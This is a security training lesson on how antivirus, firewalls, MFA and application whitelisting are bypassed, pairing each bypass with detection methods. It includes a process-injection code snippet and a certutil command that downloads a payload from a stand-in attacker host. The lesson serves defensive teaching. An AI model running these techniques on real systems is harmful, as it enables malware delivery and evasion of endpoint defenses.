# Control Bypass — When Preventive Controls Fail

**Module**: M10 · Layered Defense — From Controls to Detection  
**Type**: core  
**Estimated time**: 25 minutes  
**Claim**: C19 from Strata synthesis

---

## The core idea

A **preventive control** is a security measure designed to stop an attack from succeeding. Firewalls, antivirus, MFA, and application whitelisting are preventive controls. Every preventive control fails eventually — through vulnerabilities, misconfigurations, social engineering, novel attack techniques, or simple human error.

The research (Claim C19) states: **every preventive control must be paired with detection**. This lesson examines how preventive controls are bypassed, why bypass is inevitable for any individual control, and what the architectural implication is: prevention and detection are complementary layers, not alternatives.

**Key definition — Control bypass**: Achieving the attacker's objective (code execution, data access, persistence) in a way that does not trigger a specific preventive control, or that exploits the control's limitations.

## Why it matters

The most dangerous security posture is **high confidence in a single preventive control**. Organizations that rely on antivirus as their primary defense invest in keeping signatures updated and report their "AV coverage" as a security metric — while having no visibility into what happens when AV misses something. The breach may already be in progress; they just cannot see it.

Understanding bypass techniques teaches two things: why no preventive control is sufficient alone, and what the detection complement for each control should be.

## A concrete example

### Antivirus and EDR Bypass

**The control**: Antivirus (AV) and Endpoint Detection and Response (EDR) tools detect and block malicious executables by comparing them against signature databases (known malware file hashes) and behavioral heuristics (code that behaves like malware).

**The bypass**: Any technique that changes the malware's signature without changing its function.

**Technique 1 — Custom compiled payloads**: Most AV bypass in penetration tests involves writing custom code rather than using pre-compiled, publicly known tools. Metasploit's `meterpreter` is heavily signatured; a custom C2 implant compiled for the specific engagement typically is not.

**Technique 2 — Shellcode injection**: Instead of writing a malicious executable that AV scans, inject shellcode (raw machine code) into a legitimate process's memory. AV scans files on disk; injecting into already-running processes (like `explorer.exe`) avoids disk-based scanning.

```c
// Conceptual: allocate memory in target process, write shellcode, execute it
// AV sees explorer.exe running (legitimate), not a malicious binary
VirtualAllocEx(hProcess, NULL, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(hProcess, pShellcode, shellcode, shellcodeSize, NULL);
CreateRemoteThread(hProcess, NULL, 0, pShellcode, NULL, 0, NULL);
```

**What detection catches this**: Sysmon Event 1 shows unusual child processes of `explorer.exe`; Event 8 shows `CreateRemoteThread` calls between processes from different users; EDR process injection detection looks for `VirtualAllocEx` + `WriteProcessMemory` + `CreateRemoteThread` in sequence.

**Technique 3 — Living off the Land (LotL)**: Using built-in Windows tools for malicious purposes — they are signed by Microsoft and trusted by AV:
- `certutil.exe` (certificate utility) → download files from the internet
- `wscript.exe` / `cscript.exe` → execute JavaScript or VBScript payloads
- `mshta.exe` → execute HTA (HTML Application) files
- `regsvr32.exe` → execute COM scripts

```cmd
# Download and execute a payload using certutil (signed Microsoft binary)
certutil.exe -urlcache -split -f http://attacker.example.com/payload.exe payload.exe
```

**What detection catches this**: Application whitelisting does not help — `certutil.exe` is whitelisted. Sysmon Event 1 with `certutil.exe -urlcache` as command line; network firewall alert for `certutil.exe` initiating outbound HTTP; SIEM rule matching known-bad LotL command patterns.

---

### Firewall Bypass

**The control**: Network firewalls block traffic on disallowed ports and from/to disallowed hosts.

**The bypass 1 — Allowed ports**: Firewalls block port 4444 (default Metasploit listener) but allow port 443 (HTTPS). C2 traffic over port 443 with HTTPS encryption is indistinguishable from legitimate web traffic to many firewalls.

**The bypass 2 — DNS**: Firewalls almost universally allow outbound DNS (port 53 UDP). DNS C2 (covered in L09) tunnels commands and data in DNS queries. The firewall permits every packet.

**The bypass 3 — Protocol smuggling**: HTTP request smuggling (covered in L06) causes firewalls and reverse proxies that parse HTTP differently to see different requests, allowing attackers to bypass URL-based blocking rules.

**What detection catches this**: Deep packet inspection (DPI) for anomalous TLS patterns; DNS query analysis for high-volume random subdomain queries; proxy logs showing unusual user-agent strings or excessive outbound data volume.

---

### MFA Bypass

**The control**: Multi-factor authentication requires a second factor (TOTP code, push notification, hardware key) in addition to a password. Protects against credential stuffing and password theft.

**The bypass 1 — MFA fatigue / push bombing**: Attacker steals a valid password, then repeatedly sends push notification authentication requests. The user, fatigued by repeated prompts, eventually approves one.

**The bypass 2 — Real-time phishing (adversary-in-the-middle)**: Attacker runs a transparent proxy phishing site. User authenticates to the attacker's site, which forwards credentials and MFA codes in real time to the legitimate site. The attacker captures the session cookie — which does not require MFA again (the session is already authenticated).

```
User → Attacker Proxy → Legitimate Site
         ↓
  Captures session cookie
```

Tools: Evilginx2, Modlishka.

**The bypass 3 — SIM swapping / SS7 attacks**: SMS-based MFA is vulnerable to SIM swap (social engineering the carrier to transfer the victim's number) or SS7 protocol attacks that intercept SMS. NIST deprecated SMS OTP as a primary MFA factor in 2017.

**What detection catches this**: Anomalous login source geography (user authenticated from new country); authentication from unusual IP after successful MFA (session cookie theft); multiple failed MFA push requests in short window (push bombing attempt); FIDO2 / hardware keys are resistant to these bypasses because they bind to the specific site origin.

---

### Application Whitelisting Bypass

**The control**: Application whitelisting (Windows AppLocker, WDAC) blocks execution of unauthorized executables — only explicitly approved programs run.

**The bypass — Trusted binaries with code execution**:
Some Microsoft-signed binaries trusted by AppLocker can execute arbitrary code:
- `msbuild.exe`: Build tool that executes C# code from XML project files
- `installutil.exe`: .NET installer that executes arbitrary code in `[RunInstaller]` classes
- `regsvcs.exe`, `regasm.exe`: Register COM components (execute code in the process)

These are called **LOLBins** (Living off the Land Binaries) — signed, whitelisted, but capable of arbitrary code execution.

**What detection catches this**: Sysmon Event 1 with these processes executing with unusual arguments; SIEM rules specifically watching for `msbuild.exe` building outside of development environments; behavioral EDR detecting code execution patterns from build tools.

---

### The Architectural Implication

Every bypass above is eventually detectable — not at the prevention layer, but at the detection layer:

| Control | Typical Bypass | Detection Complement |
|---------|---------------|---------------------|
| Antivirus | Custom shellcode, LotL | EDR behavioral analysis, Sysmon Event 1/8 |
| Firewall | HTTPS/DNS C2, protocol smuggling | DPI, DNS query analysis, proxy logs |
| MFA | Push fatigue, AiTM phishing | Login geography anomaly, session cookie reuse detection |
| App whitelisting | LOLBins | Sysmon Event 1 with suspicious parent-child pairs |

The conclusion (Claim C19): a security architecture that invests heavily in prevention but lightly in detection will have excellent visibility into the attacks it prevents and zero visibility into the attacks that succeed. Detection must be co-designed with prevention, not added as an afterthought.

## Key points

- No preventive control is unbypassable; AV is bypassed by custom shellcode and LotL; firewalls are bypassed by C2 over 443/DNS; MFA is bypassed by push fatigue and AiTM phishing; app whitelisting is bypassed by LOLBins
- Living off the Land (LotL): abusing built-in signed binaries (`certutil`, `msbuild`, `installutil`) that preventive controls trust; detection must recognize unusual use of legitimate tools
- MFA hardening: prefer FIDO2 hardware keys (bind to site origin, immune to AiTM phishing) over TOTP or SMS; monitor for push fatigue patterns (repeated MFA rejections from same account in short window)
- Every bypass is eventually detectable at the behavioral layer — detection must be designed alongside prevention, not added after
- Overconfidence in a single preventive control is the most dangerous security posture; the question is not "can this be bypassed?" (it can) but "what detects it when it is?"

## Go deeper

- [S019](../../../../vault/research/security-foundations/01-sources/) — Control bypass catalog and detection pairings
- [S020](../../../../vault/research/security-foundations/01-sources/) — FIDO2 and phishing-resistant MFA design

---

*[← Previous: Least Privilege](./L28-least-privilege.md)* · *[Next: Layered Authentication — Defense in Depth →](./L30-layered-authentication.md)*
